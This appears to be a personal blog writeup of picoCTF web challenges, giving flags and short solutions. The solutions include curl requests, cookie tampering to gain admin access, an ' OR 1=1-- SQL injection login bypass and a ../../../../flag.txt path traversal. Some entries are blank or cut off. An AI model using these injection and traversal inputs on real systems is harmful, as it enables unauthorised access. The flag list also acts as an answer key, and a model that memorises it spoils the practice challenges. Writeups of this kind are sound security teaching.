---
title: picoCTF (Web) - Writeup
time: 2024-07-16 12:00:00
categories: [web]
tags: []
image: /assets/posts/picoctf/icon.svg
---

A writeup for picoGym's web challenges.

# Web

## WebDecode
Flag: `picoCTF{web_succ3ssfully_d3c0ded_1f832615}`

Do you know how to use the web inspector?

```
view-source:http://titan.picoctf.net:62489/about.html
```

## Unminify
Flag: `picoCTF{pr3tty_c0d3_b99eb82e}`

I don't like scrolling down to read the code of my website, so I've squished it. As a bonus, my pages load faster!

Just enable line wrap on the view source.
```
view-source:http://titan.picoctf.net:57062/
```

## IntroToBurp
Flag: ``

Try here to find the flag

## Bookmarklet
Flag: `picoCTF{p@g3_turn3r_0c0d211f}`

Why search for the flag when I can make a bookmarklet to print it for me?

Copied the code at view-source:http://titan.picoctf.net:59354/ and run the commmand in the console.

```js
javascript:(function() {
    var encryptedFlag = "àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓÓÇ¡¥Ìí";
    var key = "picoctf";
    var decryptedFlag = "";
    for (var i = 0; i < encryptedFlag.length; i++) {
        decryptedFlag += String.fromCharCode((encryptedFlag.charCodeAt(i) - key.charCodeAt(i % key.length) + 256) % 256);
    }
    alert(decryptedFlag);
})();
```

## SOAP
Flag: ``
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

## Inspect HTML
Flag: `picoCTF{1n5p3t0r_0f_h7ml_1fd8425b}`

Can you get the flag?

```
$ curl http://saturn.picoctf.net:53628/ 2>/dev/null | grep -ioE picoctf{.+}
picoCTF{1n5p3t0r_0f_h7ml_1fd8425b}
```

## Cookies
Flag: `picoCTF{3v3ry1_l0v3s_c00k135_064663be}`

Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:27177/

Upon inspecting the website, I noticed that the cookies contain a name key with a value of -1. Modifying the value of the name changes ...

![1](/assets/posts/picoctf/web/1.png)

## GET aHEAD
Flag: `picoCTF{r3j3ct_th3_du4l1ty_cca66bd3}`

Find the flag being held on this server to get ahead of the competition http://mercury.picoctf.net:47967/

Base on the hint given in the title "GET aHEAD", I've tried changing the http request from GET to HEAD and got the flag.

```
$ curl -I http://mercury.picoctf.net:47967
HTTP/1.1 200 OK
flag: picoCTF{r3j3ct_th3_du4l1ty_cca66bd3}
Content-type: text/html; charset=UTF-8
```

## Insp3ct0r
Flag: `picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?832b0699}`

Kishor Balan tipped us off that the following code may need inspection: https://jupiter.challenges.picoctf.org/problem/41511/ (link) or http://jupiter.challenges.picoctf.org:41511

```
$ curl https://jupiter.challenges.picoctf.org/problem/41511/
<...>
      <div id="tababout" class="tabcontent">
        <h3>How</h3>
        <p>I used these to make this site: <br/>
          HTML <br/>
          CSS <br/>
          JS (JavaScript)
        </p>
        <!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 -->
      </div>

    </div>

  </body>
</html>
```

```
$ curl https://jupiter.challenges.picoctf.org/problem/41511/mycss.css
<...>
#tabintro { background-color: #ccc; }
#tababout { background-color: #ccc; }

/* You need CSS to make pretty pages. Here's part 2/3 of the flag: t3ct1ve_0r_ju5t */
```

```
$ curl https://jupiter.challenges.picoctf.org/problem/41511/myjs.js
<...>
window.onload = function() {
    openTab('tabintro', this, '#222');
}

/* Javascript sure is neat. Anyways part 3/3 of the flag: _lucky?832b0699} */
```

## where are the robots
Flag: `picoCTF{ca1cu1at1ng_Mach1n3s_477ce}`

Can you find the robots? https://jupiter.challenges.picoctf.org/problem/36474/ (link) or http://jupiter.challenges.picoctf.org:36474

The title hints that the challenge has something to do with robots.txt. Upon accessing the robots file of the website, we can see that the site is disallowing a certain html file to be indexed. Visiting that specific html file will give us the flag.

```
$ curl http://jupiter.challenges.picoctf.org:36474/robots.txt
User-agent: *
Disallow: /477ce.html
```

```
$ curl http://jupiter.challenges.picoctf.org:36474/477ce.html
<!doctype html>
<html>
  <head>
    <title>Where are the robots</title>
    <link href="https://fonts.googleapis.com/css?family=Monoton|Roboto" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="style.css">
  </head>
  <body>
    <div class="container">

      <div class="content">
        <p>Guess you found the robots<br />
          <flag>picoCTF{ca1cu1at1ng_Mach1n3s_477ce}</flag></p>
      </div>
      <footer></footer>
  </body>
</html>
```

## picobrowser
Flag: `picoCTF{p1c0_s3cr3t_ag3nt_e9b160d0}`

This website can be rendered only by picobrowser, go and catch the flag! https://jupiter.challenges.picoctf.org/problem/26704/ (link) or http://jupiter.challenges.picoctf.org:26704

Upon visiting the site and clicking the flag button, we got an error saying that we're not using picobrowser. With this, we know that we need to change the user-agent of our browser or we need to specify in in curl to get the flag.

```
$ curl -H "User-Agent: picobrowser" https://jupiter.challenges.picoctf.org/problem/26704/flag 2>/dev/null | grep -ioE picoctf{.+}
picoCTF{p1c0_s3cr3t_ag3nt_e9b160d0}
```

## logon
Flag: `picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}`

The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? https://jupiter.challenges.picoctf.org/problem/13594/ (link) or http://jupiter.challenges.picoctf.org:13594

Upon logging in with username as "Joe" and a random password, we're getting an error saying Joe's password is very secure but I noticed that when you typed "Joe" in all lowercase, it would log us even with an empty password. Now the next challenge begins, it says we're logged in but we're not able to see the flag. Upon inspecting the cookies, I noticed that theres an admin key with a value of False. Changing that value to True will give us the flag.

![3](/assets/posts/picoctf/web/3.png)
![4](/assets/posts/picoctf/web/4.png)
![5](/assets/posts/picoctf/web/5.png)

## MatchTheRegex
Flag: `picoCTF{succ3ssfully_matchtheregex_c64c9546}`

How about trying to match a regular expression

Viewing the source of the webpage, we can see that there's a javascript code that fetch the flag but we need to match a certain regex. The regex that we need to match is **^p.....F!?**.

- **^p** - Word must start with p
- **.** - any printable character
- **!?** - Word can optionally have an exclamation at the end

By sending something like **picoCTF!**, we get the flag.

```
function send_request() {
  let val = document.getElementById("name").value;
  // ^p.....F!?
  fetch(`/flag?input=${val}`)
    .then(res => res.text())
    .then(res => {
      const res_json = JSON.parse(res);
      alert(res_json.flag)
      return false;
    })
  return false;
}
```

![6](/assets/posts/picoctf/web/6.png)

## Search source
Flag: `picoCTF{1nsp3ti0n_0f_w3bpag3s_8de925a7}`

The developer of this website mistakenly left an important artifact in the website source, can you find it?

Viewing the source of the site, we can see that there's a lot of css and javascript files. Upon a lot of trial an error, we can find the flag at **/css/style.css**.
```
<truncated>
.bg {
  background-color: #5ab337d6;
}

.navbar-expand-md .navbar-nav .nav-link {
    padding: 15px 48px;
    font-size: 16px;
    color: #000;
    line-height: 18px;
}
/** banner_main picoCTF{1nsp3ti0n_0f_w3bpag3s_8de925a7} **/
.carousel-indicators li {
    width: 20px;
    height: 20px;
    border-radius: 11px;
    background-color: #070000;
}
.carousel-indicators li.active {
  background-color: #35a30a;
}
.
<truncated>
```

## Scavenger Hunt
Flag: `picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_f7ce8828}`

There is some interesting information hidden around this site http://mercury.picoctf.net:39491/. Can you find it?

Viewing the source of the site, we get the first part of the flag.

```
<truncated>
      <div id="tababout" class="tabcontent">
		<h3>What</h3>
		<p>I used these to make this site: <br/>
		  HTML <br/>
		  CSS <br/>
		  JS (JavaScript)
		</p>
	<!-- Here's the first part of the flag: picoCTF{t -->
      </div>

    </div>

  </body>
</html>
```

The next part of the flag is in **/mycss.css**
```
<truncated>
.tabcontent {
    color: #111;
    display: none;
    padding: 50px;
    text-align: center;
}

#tabintro { background-color: #ccc; }
#tababout { background-color: #ccc; }

/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */
```

The next hint can be seen at the end of **/myjs.js** file.

```
<truncated>
window.onload = function() {
    openTab('tabintro', this, '#222');
}

/* How can I keep Google from indexing my website? */
```

This hints that the next flag might be in robots.txt. Viewing robots.txt will give us the next part of the flag and a hint to the next one.

```
User-agent: *
Disallow: /index.html
# Part 3: t_0f_pl4c
# I think this is an apache server... can you Access the next flag?
```

The next hint has something to do with apache servers. Upon searching, I learned that apache servers have a file called **.htaccess**. Viewing that file gives us the next part of the flag.

```
# Part 4: 3s_2_lO0k
# I love making websites on my Mac, I can Store a lot of information there.
```

The next hint says somethign about Macs. Upon a lot of searching, I found out that there's a file called **.DS_Store**. It stores custom attributes of its containing folder. Viewing that file gives us that last part of the flag.

```
Congrats! You completed the scavenger hunt. Part 5: _f7ce8828}
```

## Who are you?
Flag: `picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_b22d773c}`

Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn http://mercury.picoctf.net:38322/

Upon visiting the website, we can see a message that only those people who uses PicoBrowser are allowed to enter the site. This hints that we need to change our user-agent.

```
$ curl http://mercury.picoctf.net:38322/ 2>/dev/null | grep h3
                                <h3 style="color:red">Only people who use the official PicoBrowser are allowed on this site!</h3>
```

```
$ curl -H "User-agent: PicoBrowser" http://mercury.picoctf.net:38322/ 2>/dev/null | grep h3
                                <h3 style="color:red">I don&#39;t trust users visiting from another site.</h3>
```

```
$ curl -H "User-agent: PicoBrowser" -H "referer: mercury.picoctf.net:38322" -H "Date: 2018" -H "DNT: True" -H "X-Forwarded-For: 192.44.242.19" -H "Accept-Language: en-sv" http://mercury.picoctf.net:38322/ 2>/dev/null | grep -ioE picoctf{.+}
picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_b22d773c}
```

## SQLiLite
Flag: `picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}`

Can you login to this website?

I was able to login using Boolean-based SQL Injection. By inserting `' OR 1=1--` at the username, Bypassing authentication. After logging in, we can see the following message.

```
username: ' OR 1=1--
password: 
SQL query: SELECT * FROM users WHERE name='' OR 1=1--' AND password=''
Logged in! But can you see the flag, it is in plainsight.
```

Viewing the source, we can see the flag.

```

<pre>username: &#039; OR 1=1--
password: 
SQL query: SELECT * FROM users WHERE name=&#039;&#039; OR 1=1--&#039; AND password=&#039;&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}</p>
```

## SQL Direct
Flag: ``

Connect to this PostgreSQL server and find the flag!

## Includes
Flag: `picoCTF{1nclu51v17y_1of2_f7w_2of2_df589022}`

Can you get the flag?

Curling the webpage reveals that there's style.css and script.js. Visiting those two file reveals the flag.

```
$ curl http://saturn.picoctf.net:53908/
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <title>On Includes</title>
  </head>
  <body>
    <script src="script.js"></script>
<truncated>
```

```
$ curl http://saturn.picoctf.net:53908/style.css
body {
  background-color: lightblue;
}

/*  picoCTF{1nclu51v17y_1of2_  */
```

```
$ curl http://saturn.picoctf.net:53908/script.js



function greetings()
{
  alert("This code is in a separate file!");
}

//  f7w_2of2_df589022}
```

## findme
Flag: `picoCTF{proxies_al`

Help us test the form by submiting the username as test and password as test!

## login
Flag: `picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}`

My dog-sitter's brother made this website but I can't get in; can you help?

Blindly trying out common username and password doesn't seem to work so I've decided to look at the source. I found out that there's an index.js file with some base64 code in it. Decoding the longest base64 gives us the flag.

```
$ curl -k https://login.mars.picoctf.net/index.js
(async()=>{await new Promise((e=>window.addEventListener("load",e))),document.querySelector("form").addEventListener("submit",(e=>{e.preventDefault();const r={u:"input[name=username]",p:"input[name=password]"},t={};for(const e in r)t[e]=btoa(document.querySelector(r[e]).value).replace(/=/g,"");return"YWRtaW4"!==t.u?alert("Incorrect Username"):"cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ"!==t.p?alert("Incorrect Password"):void alert(`Correct Password! Your flag is ${atob(t.p)}.`)}))})();

$ echo cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ | base64 -d
picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}
```

## dont-use-client-side
Flag: `picoCTF{no_clients_plz_1a3c89}`

Can you break into this super secure portal? https://jupiter.challenges.picoctf.org/problem/37821/ (link) or http://jupiter.challenges.picoctf.org:37821

Trying out common passwords doesn't seem to work so I viewed its source and noticed the following javascipt code.

```
<script type="text/javascript">
  function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == 'a3c8') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_1') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == '9}') {
                  alert("Password Verified")
                  }
                }
              }
      
            }
          }
        }
      }
    }
    else {
      alert("Incorrect password");
    }
    
  }
</script>
```

From there, we can manually concatenate each string by index to get the flag.

## Roboto Sans
Flag: ``
The flag is somewhere on this web application not necessarily on the website. Find it.

## Local Authority
Flag: ``

Can you get the flag?

After I tried to input common credentials and SQLi, I failed to get flag. But after several tries, I noticed that I'm getting redirected at **/login** path. Viewing the source, I noticed that there's a file called **secure.js**.

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <title>Login Page</title>
  </head>
  <body>
    <script src="secure.js"></script>
    
    <p id='msg'></p>
<truncated>
```

Visiting the javascript file seems to show us credentials to use.

```
function checkPassword(username, password)
{
  if( username === 'admin' && password === 'strongPassword098765' )
  {
    return true;
  }
  else
  {
    return false;
  }
}
```

Logging in with the following credentials will give us the flag.

## Power Cookie
Flag: `picoCTF{gr4d3_A_c00k13_5d2505be}`

Can you get the flag?

Visiting the site and clicking the **Continue as guest** button shows an error. But based on the title, it has something to do with cookies. So I navigated to the cookies and saw a key named **isAdmin** with a value of **0**. I changed that value to 1, refresh, and it outputs the flag.

## IntroToBurp
Flag: `picoCTF{#0TP_Bypvss_SuCc3$S_6bffad21}`

Try here to find the flag

By removing Content-Type: application/x-www-form-urlencoded in the request, you get the flag.
```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:57430
Content-Length: 5
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://titan.picoctf.net:57430
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:57430/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJw9jEsOAiEQRO_C2gU0MwN4GdK2TTTOAPKJMca7y4K4q3qVVx9B9_YWZ_EUJ0G1BN_Sg-MARqEFF7RmtBZWaRyCBEtEaFmpJchgYHPL8ELfdx_x4PmTWh5p3ZR2atSMtb5Suc4131JkH_tx4TJRr1z-_vcHj3Mr5g.ZpeBwQ.jkXPRd3SaJHsS9AXiuEwPB3Ly7c
Connection: keep-alive

otp=q
```

## Forbidden Paths
Flag: `picoCTF{7h3_p47h_70_5ucc355_e5fe3d4d}`

We know that the website files live in /usr/share/nginx/html/ and the flag is at /flag.txt but the website is filtering absolute file paths. Can you get past the filter to read the flag?

It is said that the flag can be found in the root directory but using absolute path is forbidden. So I've tried accessing the flag using the relative path. We can view the flag by inputting **../../../../flag.txt** in the form.

## It is my Birthday
Flag: `picoCTF{c0ngr4ts_u_r_1nv1t3d_73b0c8ad}`

I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website. http://mercury.picoctf.net:50970/

The challenge is requiring us to upload a two pdf file with different content but same md5 hash. We can do this by taking advantage of hash collisions. Researching in the web, I found two pdf file satisfying the requirements. [pdf1](https://github.com/corkami/collisions/blob/master/examples/free/md5-1.pdf) [pdf2](https://github.com/corkami/collisions/blob/master/examples/free/md5-2.pdf). Uploading both of the files returns a php code that contains the flag.

```
<...>
        } else {
            echo "Not a PDF!";
            die();
        }
    } else {
        echo "File too large!";
        die();
    }
}

// FLAG: picoCTF{c0ngr4ts_u_r_1nv1t3d_73b0c8ad}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <title>It is my Birthday</title>
<...>
```
